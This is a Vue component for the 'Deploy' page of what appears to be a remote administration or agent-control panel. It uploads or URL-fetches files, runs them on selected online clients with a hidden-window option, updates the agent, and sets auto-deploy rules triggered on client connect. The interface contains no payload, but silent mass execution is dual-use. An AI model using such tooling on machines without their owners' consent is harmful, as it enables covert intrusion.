<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue'
import { api } from '../lib/api'
import AppSelect from '../components/ui/AppSelect.vue'

interface Client {
  id: string; host: string; nickname?: string; user: string; os: string; online: boolean
}

interface UploadResult {
  uploadId: string; os: string; name: string; size: number
}

interface DeployResult {
  clientId: string; ok: boolean; reason?: string; command?: string
}

interface AutoDeploy {
  id: string; name: string; trigger: string; args?: string; hideWindow: boolean
  enabled: boolean; osFilter: string[]; fileName: string; fileSize: number; createdAt: string
}

const clients = ref<Client[]>([])
const selectedClients = ref<string[]>([])
const loading = ref(true)
const searchQuery = ref('')
const osFilter = ref('')
const activeTab = ref<'upload' | 'url' | 'auto-deploy'>('upload')
const outputLines = ref<{ clientId: string; host: string; ok: boolean; detail: string }[]>([])

const selectedFile = ref<File | null>(null)
const dragOver = ref(false)
const fileInput = ref<HTMLInputElement | null>(null)
const uploadResult = ref<UploadResult | null>(null)
const uploading = ref(false)
const uploadProgress = ref(0)

const urlInput = ref('')
const fetchingUrl = ref(false)

const execArgs = ref('')
const hideWindow = ref(true)
const deploying = ref(false)
const updating = ref(false)

const autoDeploys = ref<AutoDeploy[]>([])
const loadingAutoDeploys = ref(false)
const showAutoDeployForm = ref(false)
const autoDeployFile = ref<File | null>(null)
const autoDeployForm = ref({ name: '', trigger: 'on_connect', args: '', hideWindow: true, enabled: true, osFilter: [] as string[] })

const osOptions = ['windows', 'linux', 'darwin', 'android', 'freebsd', 'ios']

const filteredClients = computed(() => {
  return clients.value.filter(c => {
    if (searchQuery.value) {
      const q = searchQuery.value.toLowerCase()
      if (!c.host.toLowerCase().includes(q) && !c.id.toLowerCase().includes(q) && !(c.nickname || '').toLowerCase().includes(q) && !c.user.toLowerCase().includes(q)) return false
    }
    if (osFilter.value && !c.os.toLowerCase().includes(osFilter.value)) return false
    return true
  })
})

const selectedOs = computed(() => uploadResult.value?.os || '')
const compatibleClients = computed(() => {
  if (!selectedOs.value) return filteredClients.value
  return filteredClients.value.filter(c => {
    const co = c.os.toLowerCase()
    if (selectedOs.value === 'windows') return co.includes('windows')
    if (selectedOs.value === 'linux') return co.includes('linux')
    if (selectedOs.value === 'mac') return co.includes('darwin') || co.includes('mac')
    if (selectedOs.value === 'unix') return co.includes('linux') || co.includes('darwin') || co.includes('mac') || co.includes('freebsd')
    return true
  })
})

async function loadClients() {
  loading.value = true
  try {
    const data = await api.get<{ items: Client[] }>('/api/clients?pageSize=10000')
    clients.value = (data.items || []).filter((c: any) => c.online)
  } catch {} finally { loading.value = false }
}

function onDragOver(e: DragEvent) { e.preventDefault(); dragOver.value = true }
function onDragLeave() { dragOver.value = false }
function onDrop(e: DragEvent) {
  e.preventDefault(); dragOver.value = false
  if (e.dataTransfer?.files?.length) selectedFile.value = e.dataTransfer.files[0]
}
function onFileSelect(e: Event) {
  const input = e.target as HTMLInputElement
  if (input.files?.length) selectedFile.value = input.files[0]
}

async function uploadFile() {
  if (!selectedFile.value) return
  uploading.value = true; uploadProgress.value = 0; uploadResult.value = null
  error.value = ''; success.value = ''
  try {
    const formData = new FormData()
    formData.append('file', selectedFile.value)
    const xhr = new XMLHttpRequest()
    const respData = await new Promise<any>((resolve, reject) => {
      xhr.upload.onprogress = (e) => { if (e.lengthComputable) uploadProgress.value = Math.round((e.loaded / e.total) * 100) }
      xhr.onload = () => {
        if (xhr.status >= 200 && xhr.status < 300) resolve(JSON.parse(xhr.responseText))
        else reject(new Error(xhr.statusText || 'Upload failed'))
      }
      xhr.onerror = () => reject(new Error('Upload failed'))
      xhr.open('POST', '/api/deploy/upload')
      xhr.send(formData)
    })
    uploadResult.value = respData
    success.value = `Uploaded: ${respData.name} (${respData.os})`
  } catch (e: any) { error.value = e.message || 'Upload failed' }
  finally { uploading.value = false }
}

async function fetchUrl() {
  if (!urlInput.value) return
  fetchingUrl.value = true; uploadResult.value = null; error.value = ''; success.value = ''
  try {
    const data = await api.post<UploadResult>('/api/deploy/fetch-url', { url: urlInput.value })
    uploadResult.value = data
    success.value = `Fetched: ${data.name} (${data.os})`
  } catch (e: any) { error.value = e.message || 'Fetch failed' }
  finally { fetchingUrl.value = false }
}

async function executeDeploy() {
  if (!uploadResult.value || selectedClients.value.length === 0) return
  deploying.value = true; error.value = ''; outputLines.value = []
  try {
    const data = await api.post<{ results: DeployResult[] }>('/api/deploy/run', {
      uploadId: uploadResult.value.uploadId,
      clientIds: selectedClients.value,
      args: execArgs.value || undefined,
      hideWindow: hideWindow.value
    })
    for (const r of data.results || []) {
      const c = clients.value.find(x => x.id === r.clientId)
      outputLines.value.push({ clientId: r.clientId, host: c?.nickname || c?.host || r.clientId, ok: r.ok, detail: r.reason || r.command || 'OK' })
    }
  } catch (e: any) { error.value = e.message || 'Deploy failed' }
  finally { deploying.value = false }
}

async function updateDeploy() {
  if (!uploadResult.value || selectedClients.value.length === 0) return
  updating.value = true; error.value = ''; outputLines.value = []
  try {
    const data = await api.post<{ results: DeployResult[] }>('/api/deploy/update', {
      uploadId: uploadResult.value.uploadId,
      clientIds: selectedClients.value
    })
    for (const r of data.results || []) {
      const c = clients.value.find(x => x.id === r.clientId)
      outputLines.value.push({ clientId: r.clientId, host: c?.nickname || c?.host || r.clientId, ok: r.ok, detail: r.reason || 'OK' })
    }
  } catch (e: any) { error.value = e.message || 'Update failed' }
  finally { updating.value = false }
}

function toggleClient(id: string) {
  const idx = selectedClients.value.indexOf(id)
  if (idx >= 0) selectedClients.value.splice(idx, 1); else selectedClients.value.push(id)
}
function selectAll() {
  const ids = compatibleClients.value.map(c => c.id)
  if (selectedClients.value.length === ids.length) selectedClients.value = []; else selectedClients.value = [...ids]
}
function clearFile() {
  selectedFile.value = null; uploadResult.value = null; uploadProgress.value = 0
  if (fileInput.value) fileInput.value.value = ''
}

async function loadAutoDeploys() {
  loadingAutoDeploys.value = true
  try {
    const data = await api.get<{ items: AutoDeploy[] }>('/api/auto-deploys')
    autoDeploys.value = data.items || []
  } catch {} finally { loadingAutoDeploys.value = false }
}

async function createAutoDeploy() {
  if (!autoDeployFile.value) return
  error.value = ''
  try {
    const fd = new FormData()
    fd.append('file', autoDeployFile.value)
    fd.append('name', autoDeployForm.value.name)
    fd.append('trigger', autoDeployForm.value.trigger)
    fd.append('args', autoDeployForm.value.args)
    fd.append('hideWindow', String(autoDeployForm.value.hideWindow))
    fd.append('enabled', String(autoDeployForm.value.enabled))
    fd.append('osFilter', JSON.stringify(autoDeployForm.value.osFilter))
    const res = await fetch('/api/auto-deploys', { method: 'POST', credentials: 'include', body: fd })
    if (!res.ok) throw new Error('Failed to create auto-deploy')
    showAutoDeployForm.value = false; autoDeployFile.value = null
    autoDeployForm.value = { name: '', trigger: 'on_connect', args: '', hideWindow: true, enabled: true, osFilter: [] }
    await loadAutoDeploys()
  } catch (e: any) { error.value = e.message || 'Failed' }
}

async function toggleAutoDeploy(ad: AutoDeploy) {
  try {
    await api.put(`/api/auto-deploys/${ad.id}`, { enabled: !ad.enabled })
    ad.enabled = !ad.enabled
  } catch (e: any) { error.value = e.message || 'Failed' }
}

async function deleteAutoDeploy(id: string) {
  try {
    await api.delete(`/api/auto-deploys/${id}`)
    autoDeploys.value = autoDeploys.value.filter(a => a.id !== id)
  } catch (e: any) { error.value = e.message || 'Failed' }
}

const error = ref('')
const success = ref('')

onMounted(() => { loadClients(); loadAutoDeploys() })
</script>

<template>
  <div>
    <div class="section-header">
      <h1 class="section-title"><i class="fa-solid fa-rocket" style="margin-right:8px;color:#86efac"></i>Deploy</h1>
      <span class="badge badge-sm">{{ compatibleClients.length }} compatible clients</span>
    </div>

    <div v-if="error" class="alert alert-error" style="margin-bottom:16px"><i class="fa-solid fa-circle-exclamation"></i>{{ error }}</div>
    <div v-if="success" class="alert alert-success" style="margin-bottom:16px"><i class="fa-solid fa-circle-check"></i>{{ success }}</div>

    <div style="display:flex;gap:2px;margin-bottom:20px;border-bottom:1px solid var(--cv-border)">
      <button v-for="tab in (['upload','url','auto-deploy'] as const)" :key="tab" class="settings-tab" :class="{'settings-tab-active': activeTab===tab}" @click="activeTab=tab" style="text-transform:capitalize">
        {{ tab === 'auto-deploy' ? 'Auto-Deploy' : tab === 'upload' ? 'Upload File' : 'From URL' }}
      </button>
    </div>

    <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px" v-if="activeTab !== 'auto-deploy'">
      <div style="display:flex;flex-direction:column;gap:16px">
        <div class="panel" v-if="activeTab==='upload'">
          <h2 style="font-size:13px;font-weight:600;color:#cbd5e1;margin-bottom:10px">Upload Package</h2>
          <div @dragover="onDragOver" @dragleave="onDragLeave" @drop="onDrop" @click="fileInput?.click()" :style="{border: '2px dashed '+(dragOver?'#6366f1':'rgba(148,163,184,0.2)'),borderRadius:'12px',padding:'28px',textAlign:'center',cursor:'pointer',transition:'all 150ms'}">
            <input ref="fileInput" type="file" class="hidden" @change="onFileSelect" />
            <template v-if="selectedFile">
              <i class="fa-solid fa-file-archive" style="font-size:24px;color:#94a3b8;margin-bottom:8px;display:block"></i>
              <div style="font-size:13px;color:#e2e8f0">{{ selectedFile.name }}</div>
              <div style="font-size:11px;color:#64748b;margin-top:4px">{{ (selectedFile.size / 1024 / 1024).toFixed(1) }} MB</div>
              <button @click.stop="clearFile" style="font-size:11px;color:#94a3b8;margin-top:8px;background:none;border:none;cursor:pointer">Remove</button>
            </template>
            <template v-else>
              <i class="fa-solid fa-cloud-arrow-up" style="font-size:24px;color:#64748b;margin-bottom:8px;display:block"></i>
              <div style="font-size:13px;color:#94a3b8">Drop file here or click to browse</div>
            </template>
          </div>
          <div v-if="uploadProgress > 0 && uploading" style="margin-top:10px">
            <div style="display:flex;justify-content:space-between;font-size:11px;color:#94a3b8;margin-bottom:4px">
              <span>Uploading...</span><span>{{ uploadProgress }}%</span>
            </div>
            <div style="height:4px;background:rgba(15,23,42,0.6);border-radius:999px;overflow:hidden">
              <div :style="{width: uploadProgress+'%',height:'100%',background:'linear-gradient(90deg,#4f6bff,#715dff)',borderRadius:'999px',transition:'width 200ms'}"></div>
            </div>
          </div>
          <button v-if="selectedFile && !uploadResult" @click="uploadFile" :disabled="uploading" class="btn btn-primary btn-sm" style="margin-top:12px;width:100%">
            <i v-if="uploading" class="fa-solid fa-spinner fa-spin"></i>{{ uploading ? 'Uploading...' : 'Upload' }}
          </button>
          <div v-if="uploadResult" style="margin-top:10px;padding:10px;background:rgba(34,197,94,0.06);border:1px solid rgba(34,197,94,0.2);border-radius:8px;font-size:12px;color:#86efac">
            <i class="fa-solid fa-check" style="margin-right:6px"></i>{{ uploadResult.name }} — OS: {{ uploadResult.os }}
          </div>
        </div>

        <div class="panel" v-if="activeTab==='url'">
          <h2 style="font-size:13px;font-weight:600;color:#cbd5e1;margin-bottom:10px">Fetch from URL</h2>
          <input v-model="urlInput" placeholder="https://example.com/file.exe" class="input" style="width:100%;margin-bottom:10px" />
          <button @click="fetchUrl" :disabled="!urlInput || fetchingUrl" class="btn btn-primary btn-sm" style="width:100%">
            <i v-if="fetchingUrl" class="fa-solid fa-spinner fa-spin"></i>{{ fetchingUrl ? 'Fetching...' : 'Fetch' }}
          </button>
          <div v-if="uploadResult && activeTab==='url'" style="margin-top:10px;padding:10px;background:rgba(34,197,94,0.06);border:1px solid rgba(34,197,94,0.2);border-radius:8px;font-size:12px;color:#86efac">
            <i class="fa-solid fa-check" style="margin-right:6px"></i>{{ uploadResult.name }} — OS: {{ uploadResult.os }}
          </div>
        </div>

        <div class="panel" v-if="uploadResult">
          <h2 style="font-size:13px;font-weight:600;color:#cbd5e1;margin-bottom:10px">Options</h2>
          <div style="display:flex;flex-direction:column;gap:10px">
            <div>
              <label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:4px">Arguments</label>
              <input v-model="execArgs" placeholder="--silent --path C:\..." class="input" style="width:100%" />
            </div>
            <div style="display:flex;align-items:center;gap:10px">
              <button type="button" class="toggle" :class="{active: hideWindow}" @click="hideWindow = !hideWindow"></button>
              <span style="font-size:13px;color:#cbd5e1">Hide Window</span>
            </div>
          </div>
          <div style="display:flex;gap:8px;margin-top:14px">
            <button @click="executeDeploy" :disabled="selectedClients.length===0||deploying" class="btn btn-success btn-sm" style="flex:1">
              <i v-if="deploying" class="fa-solid fa-spinner fa-spin"></i><i v-else class="fa-solid fa-play"></i>
              Execute ({{ selectedClients.length }})
            </button>
            <button @click="updateDeploy" :disabled="selectedClients.length===0||updating" class="btn btn-primary btn-sm" style="flex:1">
              <i v-if="updating" class="fa-solid fa-spinner fa-spin"></i><i v-else class="fa-solid fa-arrow-up"></i>
              Update Agent ({{ selectedClients.length }})
            </button>
          </div>
        </div>
      </div>

      <div style="display:flex;flex-direction:column;gap:16px">
        <div class="panel" style="flex:1;display:flex;flex-direction:column;max-height:calc(100vh - 200px)">
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
            <input v-model="searchQuery" placeholder="Search clients..." class="input" style="flex:1;padding:7px 10px;font-size:12px" />
            <AppSelect v-model="osFilter" :options="[{ value: '', label: 'All OS' }, ...['windows','linux','darwin'].map(o => ({ value: o, label: o }))]" size="sm" style="width:130px" />
          </div>
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;font-size:12px">
            <button @click="selectAll" class="btn btn-ghost" style="padding:4px 8px;font-size:11px">{{ selectedClients.length === compatibleClients.length ? 'Deselect' : 'Select All' }}</button>
            <span style="color:#64748b">{{ selectedClients.length }} / {{ compatibleClients.length }} selected</span>
            <button @click="loadClients" class="btn-icon-sm" style="margin-left:auto"><i class="fa-solid fa-rotate"></i></button>
          </div>
          <div style="flex:1;overflow-y:auto">
            <div v-if="loading" class="loading-state" style="padding:24px"><i class="fa-solid fa-spinner fa-spin"></i></div>
            <div v-else-if="compatibleClients.length===0" class="empty-state" style="padding:24px">No clients</div>
            <label v-for="c in compatibleClients" :key="c.id" style="display:flex;align-items:center;gap:8px;padding:7px 10px;border-bottom:1px solid var(--cv-border);cursor:pointer;font-size:13px;transition:background 100ms" onmouseover="this.style.background='rgba(255,255,255,0.03)'" onmouseout="this.style.background=''">
              <input type="checkbox" :checked="selectedClients.includes(c.id)" @change="toggleClient(c.id)" style="accent-color:#6366f1" />
              <span class="status-dot" :class="c.online ? 'status-dot-online' : 'status-dot-offline'" style="width:6px;height:6px"></span>
              <span style="color:#e2e8f0;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">{{ c.nickname || c.host }}</span>
              <span style="font-size:11px;color:#64748b">{{ c.os }}</span>
            </label>
          </div>
        </div>

        <div class="panel" v-if="outputLines.length">
          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
            <h2 style="font-size:13px;font-weight:600;color:#cbd5e1">Output</h2>
            <button @click="outputLines = []" class="btn btn-ghost" style="padding:3px 6px;font-size:11px">Clear</button>
          </div>
          <div style="max-height:200px;overflow-y:auto;font-family:ui-monospace,monospace;font-size:11px">
            <div v-for="(line, i) in outputLines" :key="i" style="display:flex;gap:8px;padding:4px 0;border-bottom:1px solid var(--cv-border)">
              <i :class="line.ok ? 'fa-solid fa-check-circle' : 'fa-solid fa-xmark-circle'" :style="{color: line.ok ? '#86efac' : '#fca5a5', fontSize:'11px', marginTop:'2px'}"></i>
              <div>
                <span style="color:#e2e8f0;font-weight:500">{{ line.host }}</span>
                <span style="color:#64748b;margin-left:6px">{{ line.detail }}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div v-if="activeTab === 'auto-deploy'" class="panel">
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
        <h2 style="font-size:13px;font-weight:600;color:#cbd5e1">Auto-Deploy Rules</h2>
        <button @click="showAutoDeployForm = !showAutoDeployForm" class="btn btn-primary btn-sm">
          <i class="fa-solid fa-plus"></i>{{ showAutoDeployForm ? 'Cancel' : 'New Rule' }}
        </button>
      </div>

      <div v-if="showAutoDeployForm" style="padding:16px;background:var(--ui-surface);border:1px solid var(--ui-border);border-radius:12px;margin-bottom:16px">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
          <div style="display:flex;flex-direction:column;gap:4px">
            <label style="font-size:11px;color:#94a3b8">Name</label>
            <input v-model="autoDeployForm.name" class="input" style="width:100%" placeholder="Rule name" />
          </div>
          <div style="display:flex;flex-direction:column;gap:4px">
            <label style="font-size:11px;color:#94a3b8">Trigger</label>
            <AppSelect v-model="autoDeployForm.trigger" :options="[{ value: 'on_connect', label: 'On Connect' }, { value: 'on_first_connect', label: 'First Connect Only' }, { value: 'on_connect_once', label: 'Connect Once' }]" size="sm" />
          </div>
          <div style="display:flex;flex-direction:column;gap:4px">
            <label style="font-size:11px;color:#94a3b8">Arguments</label>
            <input v-model="autoDeployForm.args" class="input" style="width:100%" placeholder="Optional args" />
          </div>
          <div style="display:flex;flex-direction:column;gap:4px">
            <label style="font-size:11px;color:#94a3b8">File</label>
            <input type="file" @change="(e: any) => autoDeployFile = e.target.files?.[0] || null" class="input" style="width:100%;padding:6px" />
          </div>
          <div style="grid-column:span 2;display:flex;gap:12px;align-items:center">
            <label v-for="os in osOptions" :key="os" style="display:flex;align-items:center;gap:4px;font-size:12px;color:#94a3b8;cursor:pointer">
              <input type="checkbox" :value="os" v-model="autoDeployForm.osFilter" style="accent-color:#6366f1" />{{ os }}
            </label>
          </div>
          <div style="grid-column:span 2;display:flex;gap:12px;align-items:center">
            <div style="display:flex;align-items:center;gap:8px">
              <button type="button" class="toggle" :class="{active:autoDeployForm.hideWindow}" @click="autoDeployForm.hideWindow = !autoDeployForm.hideWindow"></button>
              <span style="font-size:12px;color:#cbd5e1">Hide Window</span>
            </div>
            <div style="display:flex;align-items:center;gap:8px">
              <button type="button" class="toggle" :class="{active:autoDeployForm.enabled}" @click="autoDeployForm.enabled = !autoDeployForm.enabled"></button>
              <span style="font-size:12px;color:#cbd5e1">Enabled</span>
            </div>
            <button @click="createAutoDeploy" :disabled="!autoDeployForm.name || !autoDeployFile" class="btn btn-primary btn-sm" style="margin-left:auto">
              <i class="fa-solid fa-plus"></i>Create
            </button>
          </div>
        </div>
      </div>

      <div v-if="loadingAutoDeploys" class="loading-state"><i class="fa-solid fa-spinner fa-spin"></i> Loading...</div>
      <div v-else-if="autoDeploys.length === 0" class="empty-state">No auto-deploy rules</div>
      <div v-else style="display:flex;flex-direction:column;gap:8px">
        <div v-for="ad in autoDeploys" :key="ad.id" class="card-flat" style="display:flex;align-items:center;gap:12px;padding:12px 14px">
          <button type="button" class="toggle" :class="{active:ad.enabled}" @click="toggleAutoDeploy(ad)"></button>
          <div style="flex:1;min-width:0">
            <div style="font-size:13px;font-weight:500;color:#e2e8f0">{{ ad.name }}</div>
            <div style="font-size:11px;color:#64748b">{{ ad.trigger }} · {{ ad.fileName }} · {{ ad.osFilter?.length ? ad.osFilter.join(', ') : 'all OS' }}</div>
          </div>
          <button @click="deleteAutoDeploy(ad.id)" class="btn btn-danger btn-sm" style="padding:4px 8px"><i class="fa-solid fa-trash"></i></button>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
.settings-tab {
  padding: 10px 16px; font-size: 0.875rem; font-weight: 500; color: #64748b;
  background: transparent; border: none; border-bottom: 2px solid transparent;
  transition: all 140ms ease; cursor: pointer;
}
.settings-tab:hover { color: #94a3b8; }
.settings-tab-active { color: #e8edf2; border-bottom-color: #6366f1; }
</style>
